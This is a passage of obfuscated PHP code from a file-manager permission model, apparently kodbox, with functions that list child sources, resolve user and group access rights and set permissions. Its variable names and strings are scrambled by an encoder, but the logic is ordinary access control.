$_SERVER[èÍ×öˆøÉ]; $”úûÕ = Model($ä¬ñÍÓ¦•Ø²[1256])->sourceInfo($·é³); $ç³È¶…¹Ş‹‚ƒ = array($·é³); if ($”úûÕ[$ä¬ñÍÓ¦•Ø²[405]] == $ä¬ñÍÓ¦•Ø²[87]) { $æ¿çêí = array($ä¬ñÍÓ¦•Ø²[578] => array($ä¬ñÍÓ¦•Ø²[538], $”úûÕ[$ä¬ñÍÓ¦•Ø²[515]] . $·é³ . $ä¬ñÍÓ¦•Ø²[539])); $ç³È¶…¹Ş‹‚ƒ = Model($ä¬ñÍÓ¦•Ø²[1256])->field($ä¬ñÍÓ¦•Ø²[412])->where($æ¿çêí)->getField($ä¬ñÍÓ¦•Ø²[397], !0); $ç³È¶…¹Ş‹‚ƒ[] = $·é³; } $this->where(array($ä¬ñÍÓ¦•Ø²[412] => array($ä¬ñÍÓ¦•Ø²[413], $ç³È¶…¹Ş‹‚ƒ)))->delete(); return !0; } public function getAllChildren($Å‰×Œ»î¶¼µ) { $œ»ôÚë£Ë©¤© =& $_SERVER[èÍ×öˆøÉ]; $¬à = Model($œ»ôÚë£Ë©¤©[1256])->sourceInfo($Å‰×Œ»î¶¼µ); if ($¬à[$œ»ôÚë£Ë©¤©[405]] != $œ»ôÚë£Ë©¤©[87]) { return $this->sourceListAuth(array($Å‰×Œ»î¶¼µ)); } if ($¬à[$œ»ôÚë£Ë©¤©[406]] != SourceModel::TYPE_GROUP) { return array(); } $›ºì = 1; $Ï¡±’„ü = array($Å‰×Œ»î¶¼µ); if ($¬à[$œ»ôÚë£Ë©¤©[492]] == $œ»ôÚë£Ë©¤©[191] && $¬à[$œ»ôÚë£Ë©¤©[498]] != $›ºì) { $Ï¡±’„ü = $this->groupChidldAllRootSource($¬à[$œ»ôÚë£Ë©¤©[498]]); } $¦¤Ñ® = $this->field($œ»ôÚë£Ë©¤©[397])->group($œ»ôÚë£Ë©¤©[397])->select(); $¦¤Ñ® = array_to_keyvalue($¦¤Ñ®, $œ»ôÚë£Ë©¤©[33], $œ»ôÚë£Ë©¤©[397]); if (!$¦¤Ñ®) { return array(); } $ñ´ª¥Ô = $œ»ôÚë£Ë©¤©[1925]; $ˆ§ü…Û– = array($œ»ôÚë£Ë©¤©[397] => array($œ»ôÚë£Ë©¤©[7], $¦¤Ñ®), $œ»ôÚë£Ë©¤©[425] => $œ»ôÚë£Ë©¤©[191]); $®ùÅÍ‡…ŠÛ = Model($œ»ôÚë£Ë©¤©[827])->field($ñ´ª¥Ô)->where($ˆ§ü…Û–)->select(); $»«•» = array($Å‰×Œ»î¶¼µ); foreach ($®ùÅÍ‡…ŠÛ as $ùúØÙâ) { foreach ($Ï¡±’„ü as $ßÓ¹€Úö›¡öö) { $êª—Ú·² = $œ»ôÚë£Ë©¤©[47] . $ßÓ¹€Úö›¡öö . $œ»ôÚë£Ë©¤©[47]; $÷ÙÒ‚î = $ùúØÙâ[$œ»ôÚë£Ë©¤©[515]] . $ùúØÙâ[$œ»ôÚë£Ë©¤©[397]] . $œ»ôÚë£Ë©¤©[47]; if (strstr($÷ÙÒ‚î, $êª—Ú·²)) { $»«•»[] = $ùúØÙâ[$œ»ôÚë£Ë©¤©[397]]; break; } } } return $this->sourceListAuth($»«•»); } private function sourceListAuth($±·ıÆ) { $öº =& $_SERVER[èÍ×öˆøÉ]; $Áé = Model($öº[1256])->sourceListInfo($±·ıÆ, !0); $»ßğ¨ê£İó = $this->sourceAuthSelect($±·ıÆ); $ÚŞÅ“¾¤½’ş = array(); $åÄ¾´¥âËÌù¼ = array(); foreach ($Áé as $ˆ) { unset($ˆ[$öº[448]]); unset($ˆ[$öº[446]]); unset($ˆ[$öº[408]]); unset($ˆ[$öº[85]]); $ú¥´ = $»ßğ¨ê£İó[$ˆ[$öº[397]]]; if (!$ú¥´) { continue; } $ˆ[$öº[1926]] = $this->authTargetInfo($ú¥´); $ˆ[$öº[513]] = rtrim($ˆ[$öº[519]], $öº[8]) . $öº[8] . ltrim($ˆ[$öº[513]], $öº[8]); $ÚŞÅ“¾¤½’ş[] = $ˆ; $ßÕÕ–Áî‹’ = count(explode($öº[8], trim($ˆ[$öº[513]], $öº[8]))); $åÄ¾´¥âËÌù¼[] = $ßÕÕ–Áî‹’ + ($ˆ[$öº[29]] == $öº[77] ? 0 : 1000); } array_multisort($åÄ¾´¥âËÌù¼, SORT_ASC, $ÚŞÅ“¾¤½’ş); return $ÚŞÅ“¾¤½’ş; } private function groupChidldAllRootSource($ ïèä¹» Şß) { $çœ‹İ =& $_SERVER[èÍ×öˆøÉ]; $à = Model($çœ‹İ[1927])->groupChildrenAll($ ïèä¹» Şß); $‰ì¶±ëâÙ‡‰ = array($çœ‹İ[492] => 0, $çœ‹İ[498] => array($çœ‹İ[7], $à), $çœ‹İ[406] => SourceModel::TYPE_GROUP); $œ¿Ä = Model($çœ‹İ[827])->field($çœ‹İ[397])->where($‰ì¶±ëâÙ‡‰)->select(); $œ¿Ä = array_to_keyvalue($œ¿Ä, $çœ‹İ[33], $çœ‹İ[397]); return $œ¿Ä; } private function authTargetInfo($¸ØØ£“Ä) { $»Öº•ÄÑğ =& $_SERVER[èÍ×öˆøÉ]; $š‚µ = array(); $è±áÕ¯ÑÌéá¿ = array(); $¦ÒÔšÕì™ó‘ = 2 << 25; foreach ($¸ØØ£“Ä as $Å²Óúô©ë’ß’) { $¼ù¡ŸöÜüè  = Model($»Öº•ÄÑğ[501])->listData($Å²Óúô©ë’ß’[$»Öº•ÄÑğ[1852]]); if (!$¼ù¡ŸöÜüè ) { continue; } if ($Å²Óúô©ë’ß’[$»Öº•ÄÑğ[406]] == SourceModel::TYPE_USER) { $òÔ = Model($»Öº•ÄÑğ[507])->getInfoSimpleOuter($Å²Óúô©ë’ß’[$»Öº•ÄÑğ[498]]); if ($òÔ[$»Öº•ÄÑğ[1582]] == $»Öº•ÄÑğ[1123]) { continue; } if ($òÔ[$»Öº•ÄÑğ[1582]] == $»Öº•ÄÑğ[191]) { $òÔ[$»Öº•ÄÑğ[28]] = LNG($»Öº•ÄÑğ[1928]); } } else { $òÔ = Model($»Öº•ÄÑğ[516])->getInfoSimple($Å²Óúô©ë’ß’[$»Öº•ÄÑğ[498]]); } if (!$òÔ) { continue; } $òÔ[$»Öº•ÄÑğ[460]] = $¼ù¡ŸöÜüè ; $š‚µ[] = $òÔ; $âÙâ’µ = 0; if ($Å²Óúô©ë’ß’[$»Öº•ÄÑğ[406]] == SourceModel::TYPE_GROUP) { $âÙâ’µ = $¦ÒÔšÕì™ó‘ * 2; } if ($Å²Óúô©ë’ß’[$»Öº•ÄÑğ[406]] == SourceModel::TYPE_USER) { $âÙâ’µ = $¦ÒÔšÕì™ó‘; } if ($Å²Óúô©ë’ß’[$»Öº•ÄÑğ[406]] == SourceModel::TYPE_USER && $Å²Óúô©ë’ß’[$»Öº•ÄÑğ[498]] == $»Öº•ÄÑğ[191]) { $âÙâ’µ = 0; } $è±áÕ¯ÑÌéá¿[] = $¼ù¡ŸöÜüè [$»Öº•ÄÑğ[408]] + $âÙâ’µ; } array_multisort($è±áÕ¯ÑÌéá¿, SORT_DESC, $š‚µ); return $š‚µ; } public function getAllChildrenByUser($ˆ¢¡Á¯ú, $÷ÅíÄÜÒä Ğ) { $†æ£ =& $_SERVER[èÍ×öˆøÉ]; $œ‘œ©…±á² = Model($†æ£[532])->getInfo($÷ÅíÄÜÒä Ğ); if (!$÷ÅíÄÜÒä Ğ || !$ˆ¢¡Á¯ú || !$œ‘œ©…±á²) { return array(); } $ÉÌ¹´æô¬ ì = Model($†æ£[1256])->sourceInfo($ˆ¢¡Á¯ú); $ç“ÙûÊ¾Ú¢ = array(); $²¼Ì = 1; if ($ÉÌ¹´æô¬ ì[$†æ£[492]] == $†æ£[191] && $ÉÌ¹´æô¬ ì[$†æ£[498]] != $²¼Ì && $this->groupContainUser($ÉÌ¹´æô¬ ì[$†æ£[498]], $÷ÅíÄÜÒä Ğ)) { foreach ($œ‘œ©…±á²[$†æ£[1929]] as $Ò˜ß²Ô¾ï) { $ÀÚºÀ½ÍİÀî = Model($†æ£[516])->getInfo($Ò˜ß²Ô¾ï[$†æ£[1749]]); $ƒÎ› = Model($†æ£[532])->getInfoSimpleOuter($÷ÅíÄÜÒä Ğ); $ƒÎ›[$†æ£[460]] = $Ò˜ß²Ô¾ï[$†æ£[408]]; if (Model($†æ£[501])->authCheckAction($Ò˜ß²Ô¾ï[$†æ£[408]][$†æ£[408]], $†æ£[1769])) { continue; } $Í‰¬ÈèÀ = array($†æ£[28] => $†æ£[1534] . $ÀÚºÀ½ÍİÀî[$†æ£[28]], $†æ£[397] => $ÀÚºÀ½ÍİÀî[$†æ£[85]][$†æ£[397]], $†æ£[76] => KodIO::make($ÀÚºÀ½ÍİÀî[$†æ£[85]][$†æ£[397]]), $†æ£[492] => $†æ£[191], $†æ£[406] => $†æ£[509], $†æ£[29] => $†æ£[542], $†æ£[513] => $ÀÚºÀ½ÍİÀî[$†æ£[520]], $†æ£[1749] => $ÀÚºÀ½ÍİÀî[$†æ£[1749]], $†æ£[517] => $ÀÚºÀ½ÍİÀî[$†æ£[492]], $†æ£[1926] => array($ƒÎ›)); $ç“ÙûÊ¾Ú¢[$Í‰¬ÈèÀ[$†æ£[397]]] = $Í‰¬ÈèÀ; } } $ğÕ°•ŒŸ— = array(); $¢Ä²·ïÃ = $this->getAllChildren($ˆ¢¡Á¯ú); foreach ($¢Ä²·ïÃ as $ÌÊèØ‚¹è®“) { $ôµãñÖ¹ğ…£Ó = !1; foreach ($ÌÊèØ‚¹è®“[$†æ£[1926]] as $±Ù†Šî–‡¼) { if ($±Ù†Šî–‡¼[$†æ£[1582]]) { if ($±Ù†Šî–‡¼[$†æ£[1582]] == $÷ÅíÄÜÒä Ğ) { $ôµãñÖ¹ğ…£Ó = !0; break; } } if ($±Ù†Šî–‡¼[$†æ£[1749]]) { if ($this->groupContainUser($±Ù†Šî–‡¼[$†æ£[1749]], $÷ÅíÄÜÒä Ğ)) { $ôµãñÖ¹ğ…£Ó = !0; break; } } } if ($ôµãñÖ¹ğ…£Ó) { $ğÕ°•ŒŸ—[] = $ÌÊèØ‚¹è®“; } $ÁˆÎ‰Ê¾ÖŞ‡ = $ÌÊèØ‚¹è®“[$†æ£[397]]; if (isset($ç“ÙûÊ¾Ú¢[$ÁˆÎ‰Ê¾ÖŞ‡])) { $ÌÊèØ‚¹è®“[$†æ£[1926]][] = $ç“ÙûÊ¾Ú¢[$ÁˆÎ‰Ê¾ÖŞ‡][0]; $ç“ÙûÊ¾Ú¢[$ÁˆÎ‰Ê¾ÖŞ‡] = !1; } } $ç“ÙûÊ¾Ú¢ = array_filter(array_values($ç“ÙûÊ¾Ú¢)); $ğÕ°•ŒŸ— = array_merge($ç“ÙûÊ¾Ú¢, $ğÕ°•ŒŸ—); return $ğÕ°•ŒŸ—; } public function setAllChildrenByUser($ªç, $äÛ»Î£úì—, $®Ğ»Æû¾—ï) { $Ì¦î’š =& $_SERVER[èÍ×öˆøÉ]; $ïÓêœÏ“–µ = $this->getAllChildrenByUser($ªç, $äÛ»Î£úì—); if (!$®Ğ»Æû¾—ï || !$ïÓêœÏ“–µ) { return !1; } foreach ($ïÓêœÏ“–µ as $¨‰ŸŒºõßé¹„) { $±ò×ŠşÎ = array(); foreach ($¨‰ŸŒºõßé¹„[$Ì¦î’š[1926]] as $¼ä‹ñĞ) { $Ä¨æŸ¡‹¬Ñ· = $¼ä‹ñĞ[$Ì¦î’š[460]]; $›ÍÎ = $¼ä‹ñĞ[$Ì¦î’š[1582]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $İ¿ = $¼ä‹ñĞ[$Ì¦î’š[1582]] ? $¼ä‹ñĞ[$Ì¦î’š[1582]] : $¼ä‹ñĞ[$Ì¦î’š[1749]]; if ($¼ä‹ñĞ[$Ì¦î’š[1582]] && $¼ä‹ñĞ[$Ì¦î’š[1582]] == $äÛ»Î£úì—) { continue; } $±ò×ŠşÎ[] = array($Ì¦î’š[397] => $¨‰ŸŒºõßé¹„[$Ì¦î’š[397]], $Ì¦î’š[406] => $›ÍÎ, $Ì¦î’š[498] => intval($İ¿), $Ì¦î’š[1852] => isset($Ä¨æŸ¡‹¬Ñ·[$Ì¦î’š[395]]) ? intval($Ä¨æŸ¡‹¬Ñ·[$Ì¦î’š[395]]) : 0, $Ì¦î’š[1906] => isset($Ä¨æŸ¡‹¬Ñ·[$Ì¦î’š[1906]]) ? intval($Ä¨æŸ¡‹¬Ñ·[$Ì¦î’š[1906]]) : -1); } $±ò×ŠşÎ[] = array($Ì¦î’š[397] => $¨‰ŸŒºõßé¹„[$Ì¦î’š[397]], $Ì¦î’š[406] => SourceModel::TYPE_USER, $Ì¦î’š[498] => intval($äÛ»Î£úì—), $Ì¦î’š[1852] => intval($®Ğ»Æû¾—ï), $Ì¦î’š[1906] => -1); $this->where(array($Ì¦î’š[412] => $¨‰ŸŒºõßé¹„[$Ì¦î’š[397]]))->delete(); $this->addAll($±ò×ŠşÎ); } return !0; } public function get($Ÿ–å) { $åµî = $this->getSourceList(array($Ÿ–å), !0); return $åµî[0]; } public function getSourceList($àÀ’, $¸‚¾½ßÔİö = false, $˜Ù”Ñë ÃÃ¼ = false) { $ê½ìÉ—Ë… =& $_SERVER[èÍ×öˆøÉ]; if (!$àÀ’) { return array(); } $‚†ø = Model($ê½ìÉ—Ë…[1256]); if (!$¸‚¾½ßÔİö && count($àÀ’) == 1) { $¸‚¾½ßÔİö = array(); $¸‚¾½ßÔİö[$àÀ’[0]] = $‚†ø->sourceInfo($àÀ’[0]); } if (!$¸‚¾½ßÔİö) { $ê‚« = array($ê½ìÉ—Ë…[412] => array($ê½ìÉ—Ë…[413], $àÀ’)); $¸‚¾½ßÔİö = $‚†ø->field($ê½ìÉ—Ë…[1930])->where($ê‚«)->select(); $¸‚¾½ßÔİö = array_to_keyvalue($¸‚¾½ßÔİö, $ê½ìÉ—Ë…[397]); } $ˆŒ¡ = $àÀ’; foreach ($¸‚¾½ßÔİö as $ª÷¶× => $Ó¼ÔüøÏÛ‘²) { $„­Øä¸Èú = $‚†ø->parentLevelArray($Ó¼ÔüøÏÛ‘²[$ê½ìÉ—Ë…[515]]); $ˆŒ¡ = array_merge($ˆŒ¡, array($ª÷¶×), array_reverse($„­Øä¸Èú)); } $ˆŒ¡ = array_values(array_unique($ˆŒ¡)); if (!$ˆŒ¡) { return array(); } $ø¯üÍ‚£ = $this->sourceAuthSelect($ˆŒ¡); $ÂÈ­±Ã = array(); foreach ($ˆŒ¡ as $›¨Ü¿Ÿú) { if (isset($ø¯üÍ‚£[$›¨Ü¿Ÿú])) { $ÂÈ­±Ã[$›¨Ü¿Ÿú] = $ø¯üÍ‚£[$›¨Ü¿Ÿú]; } } $ı = $this->userIsRoot($˜Ù”Ñë ÃÃ¼); $ª¼Ê = AuthModel::authAll(); $Ü¯ÅÚ—´ş = array($ê½ìÉ—Ë…[409] => $ª¼Ê, $ê½ìÉ—Ë…[1931] => array($ê½ìÉ—Ë…[414] => 0, $ê½ìÉ—Ë…[1755] => $ª¼Ê, $ê½ìÉ—Ë…[415] => LNG($ê½ìÉ—Ë…[1932]), $ê½ìÉ—Ë…[1771] => $ê½ìÉ—Ë…[1933])); $…¥«¯Ã = array(); foreach ($¸‚¾½ßÔİö as $›¨Ü¿Ÿú => $àûÒ) { if ($ı) { $…¥«¯Ã[$›¨Ü¿Ÿú] = $Ü¯ÅÚ—´ş; continue; } $…¥«¯Ã[$›¨Ü¿Ÿú] = $this->makeSourceAuth($àûÒ, $ÂÈ­±Ã, $˜Ù”Ñë ÃÃ¼); } return $…¥«¯Ã; } public function authDeepCheck($Â‹²€¢†ñ¤, $çê  = false) { $ÒËëÏØÀôš =& $_SERVER[èÍ×öˆøÉ]; $çê  = $çê  ? $çê  : USER_ID; $â°Ÿ¤‘‚«”Ì = $this->makeAuthDeep($çê ); if (!in_array($Â‹²€¢†ñ¤, $â°Ÿ¤‘‚«”Ì[$ÒËëÏØÀôš[1934]])) { return !1; } $¿êÆ¾¯º… = array(); foreach ($â°Ÿ¤‘‚«”Ì[$ÒËëÏØÀôš[1935]] as $ÑØÕà©ê¤§ => $Î«öïôœ) { if (!in_array($Â‹²€¢†ñ¤, $Î«öïôœ)) { continue; } $¿êÆ¾¯º…[] = $ÑØÕà©ê¤§; } if (!$¿êÆ¾¯º…) { return !1; } $öÂ”Äúä = $¿êÆ¾¯º… ? $¿êÆ¾¯º…[0] : $Â‹²€¢†ñ¤; return array($ÒËëÏØÀôš[409] => -1, $ÒËëÏØÀôš[460] => array($ÒËëÏØÀôš[414] => $ÒËëÏØÀôš[1123], $ÒËëÏØÀôš[1755] => $ÒËëÏØÀôš[191], $ÒËëÏØÀôš[415] => LNG($ÒËëÏØÀôš[1936]), $ÒËëÏØÀôš[1771] => $ÒËëÏØÀôš[1937]), $ÒËëÏØÀôš[1938] => LNG($ÒËëÏØÀôš[1939]), $ÒËëÏØÀôš[1940] => $this->sourceAuthInfo($öÂ”Äúä)); } protected function makeAuthDeep($œÀÄíšˆ = false) { $‡Ñ¨§£Ë =& $_SERVER[èÍ×öˆøÉ]; static $÷œæÖ÷«–ª = array(); $œÀÄíšˆ = $œÀÄíšˆ ? $œÀÄíšˆ : USER_ID; if (isset($÷œæÖ÷«–ª[$œÀÄíšˆ])) { return $÷œæÖ÷«–ª[$œÀÄíšˆ]; } $¨ç… = Model($‡Ñ¨§£Ë[1941])->listData(); $òÖÔ = array(); foreach ($¨ç… as $™´œÃÓ÷) { if ($™´œÃÓ÷[$‡Ñ¨§£Ë[408]] == 0 && $™´œÃÓ÷[$‡Ñ¨§£Ë[1770]] == $‡Ñ¨§£Ë[87]) { $òÖÔ[] = $™´œÃÓ÷[$‡Ñ¨§£Ë[395]]; } } $Íö‡Áì´Ì = $this->userGroupParents($œÀÄíšˆ); $•¦–Ë­‰¤Ì€‚ = array($‡Ñ¨§£Ë[406] => SourceModel::TYPE_USER, $‡Ñ¨§£Ë[498] => $œÀÄíšˆ); if ($Íö‡Áì´Ì) { $•¦–Ë­‰¤Ì€‚ = array(array($‡Ñ¨§£Ë[406] => SourceModel::TYPE_USER, $‡Ñ¨§£Ë[498] => $œÀÄíšˆ), array($‡Ñ¨§£Ë[406] => SourceModel::TYPE_GROUP, $‡Ñ¨§£Ë[498] => array($‡Ñ¨§£Ë[413], $Íö‡Áì´Ì)), $‡Ñ¨§£Ë[997] => $‡Ñ¨§£Ë[1844]); } $—ü‹…ÊŞ = $this->field($‡Ñ¨§£Ë[1942])->where($•¦–Ë­‰¤Ì€‚)->select(); $ğóÂˆÑÇØÊ = array(); $ƒ‹ãÅõßğùÒ = array_to_keyvalue_group($—ü‹…ÊŞ, $‡Ñ¨§£Ë[397]); foreach ($ƒ‹ãÅõßğùÒ as $í‚ => $êŞ‚ÏÍ¹¼) { $â » = $this->authArrayCheck($êŞ‚ÏÍ¹¼, $œÀÄíšˆ); if ($â »[$‡Ñ¨§£Ë[409]] > 0) { $ğóÂˆÑÇØÊ[] = $í‚ . $‡Ñ¨§£Ë[33]; } } $äÍØàä„ = array(); $Î¦òšõ³ = $Íö‡Áì´Ì; $·éˆì‰ïÓŸ« = Model($‡Ñ¨§£Ë[1256]); $ö« = Model($‡Ñ¨§£Ë[516]); $Ù³ = array(); $ëÍ = array(); $‹‹ÏÌõŠ = array(); $ú˜ñˆ³ = array(); if ($ğóÂˆÑÇØÊ) { $‹¼Ù¬Ô•µ®Öû = $·éˆì‰ïÓŸ«->where(array($‡Ñ¨§£Ë[397] => array($‡Ñ¨§£Ë[413], $ğóÂˆÑÇØÊ)))->select(); foreach ($‹¼Ù¬Ô•µ®Öû as $š¡ÚÜ) { $³Õòõ’Â¬¼Äœ = $·éˆì‰ïÓŸ«->parentLevelArray($š¡ÚÜ[$‡Ñ¨§£Ë[515]]); $äÍØàä„ = array_merge($äÍØàä„, $³Õòõ’Â¬¼Äœ); $Î¦òšõ³[] = $š¡ÚÜ[$‡Ñ¨§£Ë[498]]; $Ù³[$š¡ÚÜ[$‡Ñ¨§£Ë[397]]] = $³Õòõ’Â¬¼Äœ; $ëÍ[$š¡ÚÜ[$‡Ñ¨§£Ë[397]]] = $š¡ÚÜ[$‡Ñ¨§£Ë[498]]; } } $Î¦òšõ³ = array_values(array_unique($Î¦òšõ³)); $–Ôˆâ—½íÇõ = $Î¦òšõ³; foreach ($–Ôˆâ—½íÇõ as $ØŞïˆ¬ß) { $ÁÕ = $ö«->getInfo($ØŞïˆ¬ß); $³Õòõ’Â¬¼Äœ = $·éˆì‰ïÓŸ«->parentLevelArray($ÁÕ[$‡Ñ¨§£Ë[515]]); $Î¦òšõ³ = array_merge($Î¦òšõ³, $³Õòõ’Â¬¼Äœ); } $Î¦òšõ³ = array_values(array_unique($Î¦òšõ³)); foreach ($Î¦òšõ³ as $ØŞïˆ¬ß) { $ÁÕ = $ö«->getInfo($ØŞïˆ¬ß); $äÍØàä„[] = $ÁÕ[$‡Ñ¨§£Ë[85]][$‡Ñ¨§£Ë[397]]; $‹‹ÏÌõŠ[$ØŞïˆ¬ß] = $ÁÕ[$‡Ñ¨§£Ë[85]][$‡Ñ¨§£Ë[397]]; $ú˜ñˆ³[$ØŞïˆ¬ß] = $·éˆì‰ïÓŸ«->parentLevelArray($ÁÕ[$‡Ñ¨§£Ë[515]]); } foreach ($Ù³ as $Ş¸–½ûìØë° => $ï€›—È ”) { $ù…Í¬ÄŞá = $ëÍ[$Ş¸–½ûìØë°]; if (!$ù…Í¬ÄŞá || !$‹‹ÏÌõŠ[$ù…Í¬ÄŞá]) { continue; } $‚¸èêª = array(); foreach ($ú˜ñˆ³[$ù…Í¬ÄŞá] as $ØŞïˆ¬ß) { $‚¸èêª[] = $‹‹ÏÌõŠ[$ØŞïˆ¬ß]; } $Ù³[$Ş¸–½ûìØë°] = array_merge($‚¸èêª, $ï€›—È ”); } $äÍØàä„ = array_values(array_unique($äÍØàä„)); $Šù‚Íª¡ = array($‡Ñ¨§£Ë[1934] => $äÍØàä„, $‡Ñ¨§£Ë[1935] => $Ù³); $÷œæÖ÷«–ª[$œÀÄíšˆ] = $Šù‚Íª¡; return $Šù‚Íª¡; } private function makeSourceAuth($ÛğˆŞØ, $ìœÚû¨¡·««´, $ÚàÊï¾Ï = false) { $ú¯ˆêŒ™¸Ã£ =& $_SERVER[èÍ×öˆøÉ]; $ŞãÏ€¦¿ = $ú¯ˆêŒ™¸Ã£[87]; $–¤­Àê¯à° = $ÛğˆŞØ[$ú¯ˆêŒ™¸Ã£[498]]; $ÔÆÚ§÷¿“ = $ÛğˆŞØ[$ú¯ˆêŒ™¸Ã£[406]] == SourceModel::TYPE_GROUP; $Æ²©äéÑ = $ÔÆÚ§÷¿“ ? $this->groupRootAuth($–¤­Àê¯à°, $ÚàÊï¾Ï) : !1; if ($Æ²©äéÑ && Model($ú¯ˆêŒ™¸Ã£[501])->authCheckAction($Æ²©äéÑ[$ú¯ˆêŒ™¸Ã£[408]], $ú¯ˆêŒ™¸Ã£[1769])) { return $this->groupAuthInfo($Æ²©äéÑ, $–¤­Àê¯à°); } $‰Ô¥ = Model($ú¯ˆêŒ™¸Ã£[1256])->parentLevelArray($ÛğˆŞØ[$ú¯ˆêŒ™¸Ã£[515]]); $‰Ô¥ = array_merge(array($ÛğˆŞØ[$ú¯ˆêŒ™¸Ã£[397]]), array_reverse($‰Ô¥)); $€‹ = !1; foreach ($‰Ô¥ as $Ê¡èƒ«) { if (!isset($ìœÚû¨¡·««´[$Ê¡èƒ«])) { continue; } $äÀ³ = $this->authMake($ìœÚû¨¡·««´[$Ê¡èƒ«], $ÚàÊï¾Ï); if ($äÀ³[$ú¯ˆêŒ™¸Ã£[460]]) { $€‹ = $äÀ³; break; } } if (!$ÔÆÚ§÷¿“) { return $€‹; } if (!$€‹ && $Æ²©äéÑ) { $€‹ = $this->groupAuthInfo($Æ²©äéÑ, $–¤­Àê¯à°); } if (!$€‹) { $¥Ü‘ÍÕ›ùäé = Model($ú¯ˆêŒ™¸Ã£[516])->getInfo($–¤­Àê¯à°); $äú•Œ†ƒ = explode($ú¯ˆêŒ™¸Ã£[47], trim($¥Ü‘ÍÕ›ùäé[$ú¯ˆêŒ™¸Ã£[515]], $ú¯ˆêŒ™¸Ã£[47])); $äú•Œ†ƒ = array_reverse($äú•Œ†ƒ); foreach ($äú•Œ†ƒ as $ùÓ) { if ($ùÓ == $ú¯ˆêŒ™¸Ã£[191] || $ùÓ == $ŞãÏ€¦¿) { continue; } $Š†‚ÂØÆªñ¬ = $this->groupRootAuth($ùÓ, $ÚàÊï¾Ï); if (!$Š†‚ÂØÆªñ¬) { continue; } $€‹ = $this->groupAuthInfo($Š†‚ÂØÆªñ¬, $ùÓ); break; } } if (!$€‹ || $€‹[$ú¯ˆêŒ™¸Ã£[409]] <= 0) { $Ù¡ = $this->authDeepCheck($ÛğˆŞØ[$ú¯ˆêŒ™¸Ã£[397]], $ÚàÊï¾Ï); if ($Ù¡) { $€‹ = $Ù¡; } } return $€‹; } private function userIsRoot($»‘±Ñ²çİ = false) { $“Ì“â›Ñ =& $_SERVER[èÍ×öˆøÉ]; if (!$»‘±Ñ²çİ && _get($GLOBALS, $“Ì“â›Ñ[499])) { return !0; } $ˆˆ¤Ó„©Ÿ´«— = Model($“Ì“â›Ñ[532])->getInfo($»‘±Ñ²çİ); $ò¨”’Í­ = Model($“Ì“â›Ñ[1943])->listData($ˆˆ¤Ó„©Ÿ´«—[$“Ì“â›Ñ[1465]]); if ($ò¨”’Í­ && $ò¨”’Í­[$“Ì“â›Ñ[505]][$“Ì“â›Ñ[1944]] == 1) { return !0; } return !1; } private function sourceAuthInfo($¢Šç…ê÷éÓŠ) { $ö¶—Ã¬ˆ‚ğ§ =& $_SERVER[èÍ×öˆøÉ]; $ıèÔ¬Ş½ÊİÃä = Model($ö¶—Ã¬ˆ‚ğ§[1256]); $ƒµ“úŒÁËùÄ = $ıèÔ¬Ş½ÊİÃä->sourceInfo($¢Šç…ê÷éÓŠ); if (!$ƒµ“úŒÁËùÄ) { return !1; } $ıèÔ¬Ş½ÊİÃä->groupPathDisplay($ƒµ“úŒÁËùÄ); $¼­”ñÜ¥Ÿéè = array($ƒµ“úŒÁËùÄ); $¼­”ñÜ¥Ÿéè = $ıèÔ¬Ş½ÊİÃä->_listAppendPath($¼­”ñÜ¥Ÿéè); $ƒµ“úŒÁËùÄ = $¼­”ñÜ¥Ÿéè[0]; $¸˜³Ô¢©Ï = $ƒµ“úŒÁËùÄ[$ö¶—Ã¬ˆ‚ğ§[513]]; if (isset($ƒµ“úŒÁËùÄ[$ö¶—Ã¬ˆ‚ğ§[521]])) { $ÆÍ×½‚ º = explode($ö¶—Ã¬ˆ‚ğ§[8], trim($ƒµ“úŒÁËùÄ[$ö¶—Ã¬ˆ‚ğ§[513]], $ö¶—Ã¬ˆ‚ğ§[8])); array_shift($ÆÍ×½‚ º); $¸˜³Ô¢©Ï = $ƒµ“úŒÁËùÄ[$ö¶—Ã¬ˆ‚ğ§[519]] . $ö¶—Ã¬ˆ‚ğ§[1945] . implode($ö¶—Ã¬ˆ‚ğ§[8], $ÆÍ×½‚ º); } return array($ö¶—Ã¬ˆ‚ğ§[415] => $ƒµ“úŒÁËùÄ[$ö¶—Ã¬ˆ‚ğ§[28]], $ö¶—Ã¬ˆ‚ğ§[76] => KodIO::make($ƒµ“úŒÁËùÄ[$ö¶—Ã¬ˆ‚ğ§[397]]), $ö¶—Ã¬ˆ‚ğ§[1946] => $¸˜³Ô¢©Ï); } private function groupAuthInfo($–’¦ß£¥Ô, $é—Ç¹ØÄö‚õš) { $ßÇ†˜ì× =& $_SERVER[èÍ×öˆøÉ]; $Û¯ = Model($ßÇ†˜ì×[516])->getInfo($é—Ç¹ØÄö‚õš); return array($ßÇ†˜ì×[1947] => intval($–’¦ß£¥Ô[$ßÇ†˜ì×[408]]), $ßÇ†˜ì×[1931] => $–’¦ß£¥Ô, $ßÇ†˜ì×[1948] => LNG($ßÇ†˜ì×[1949]), $ßÇ†˜ì×[1940] => array($ßÇ†˜ì×[415] => $Û¯[$ßÇ†˜ì×[28]], $ßÇ†˜ì×[76] => KodIO::make($Û¯[$ßÇ†˜ì×[85]][$ßÇ†˜ì×[397]]), $ßÇ†˜ì×[1946] => $Û¯[$ßÇ†˜ì×[520]])); } protected function groupRootAuth($ˆ™·, $İĞóí·˜Ü‡ = false) { $¸ÛÃŞÆÉ =& $_SERVER[èÍ×öˆøÉ]; $İĞóí·˜Ü‡ = $İĞóí·˜Ü‡ ? $İĞóí·˜Ü‡ : USER_ID; $÷Ğ„Ö¾¹×æ = $İĞóí·˜Ü‡ . $¸ÛÃŞÆÉ[1950] . $ˆ™·; static $Ş»¶æŒ– = array(); if (isset($Ş»¶æŒ–[$÷Ğ„Ö¾¹×æ])) { return $Ş»¶æŒ–[$÷Ğ„Ö¾¹×æ]; } $ĞÂÊÌÑ‘»¤ = Model($¸ÛÃŞÆÉ[516])->getInfo($ˆ™·); $ŒŒÅÃê = $this->userGroupList($İĞóí·˜Ü‡); $ÁÃ£ÈÒ×Œ = isset($ŒŒÅÃê[$ˆ™·]) ? $ŒŒÅÃê[$ˆ™·][$¸ÛÃŞÆÉ[408]] : !1; if ($ÁÃ£ÈÒ×Œ && Model($¸ÛÃŞÆÉ[501])->authCheckAction($ÁÃ£ÈÒ×Œ[$¸ÛÃŞÆÉ[408]], $¸ÛÃŞÆÉ[1769])) { $Ş»¶æŒ–[$÷Ğ„Ö¾¹×æ] = $ÁÃ£ÈÒ×Œ; return $ÁÃ£ÈÒ×Œ; } 